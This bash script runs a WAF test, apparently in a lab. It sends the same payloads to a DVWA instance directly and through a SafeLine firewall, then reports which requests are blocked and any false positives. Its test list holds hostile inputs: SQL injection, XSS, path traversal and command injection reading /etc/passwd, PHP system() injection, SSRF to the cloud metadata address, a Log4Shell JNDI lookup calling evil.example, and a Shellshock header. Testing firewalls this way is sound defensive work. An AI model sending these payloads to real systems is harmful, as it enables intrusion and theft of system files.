#!/usr/bin/env bash
# Step 4: send the same attack payloads directly to DVWA and through SafeLine, compare.
cd "$(dirname "$0")/.."; source config.env
mkdir -p reports; OUT=reports/baseline-$(date +%Y%m%d-%H%M%S).txt

# name::kind::value   kind: q = query param, h = extra header ("Name: value")
TESTS=(
"Clean request::q::1"
"SQLi tautology::q::1' OR '1'='1"
"SQLi UNION::q::1 UNION SELECT user,password FROM users--"
"SQLi time-based::q::1; SELECT SLEEP(5)--"
"XSS script tag::q::<script>alert(1)</script>"
"XSS img onerror::q::<img src=x onerror=alert(1)>"
"Path traversal::q::../../../../etc/passwd"
"Command injection::q::1; cat /etc/passwd"
"Command injection 2::q::\$(id)"
"PHP code injection::q::<?php system('id'); ?>"
"SSRF metadata::q::http://169.254.169.254/latest/meta-data/"
"Log4Shell header::h::X-Api-Version: \${jndi:ldap://evil.example/a}"
"Shellshock UA::h::User-Agent: () { :; }; /bin/cat /etc/passwd"
"Scanner UA (sqlmap)::h::User-Agent: sqlmap/1.7"
)

code(){ # url kind value
  local url="$1" kind="$2" val="$3"
  if [ "$kind" = q ]; then
    curl -s -o /dev/null -w '%{http_code}' --max-time 15 -G --data-urlencode "id=$val" "$url/"
  else
    curl -s -o /dev/null -w '%{http_code}' --max-time 15 -H "$val" "$url/?id=1"
  fi
}

{
printf '%-26s %-8s %-8s %s\n' TEST DIRECT WAF VERDICT
printf '%-26s %-8s %-8s %s\n' ---- ------ --- -------
blocked=0; attacks=0; fp=0
for t in "${TESTS[@]}"; do
  name=${t%%::*}; rest=${t#*::}; kind=${rest%%::*}; val=${rest#*::}
  d=$(code "$DIRECT_URL" "$kind" "$val"); w=$(code "$WAF_URL" "$kind" "$val")
  if [ "$name" = "Clean request" ]; then
    [ "$w" = 403 ] && { v="FALSE POSITIVE"; fp=$((fp+1)); } || v="allowed (ok)"
  else
    attacks=$((attacks+1))
    if [ "$w" = 403 ]; then v="BLOCKED"; blocked=$((blocked+1)); else v="PASSED  <-- review"; fi
  fi
  printf '%-26s %-8s %-8s %s\n' "$name" "$d" "$w" "$v"
done
echo
echo "Blocked $blocked / $attacks attack requests, false positives: $fp"
} | tee "$OUT"
echo "Saved: $OUT"
echo "Also check the dashboard -> Attack Logs."
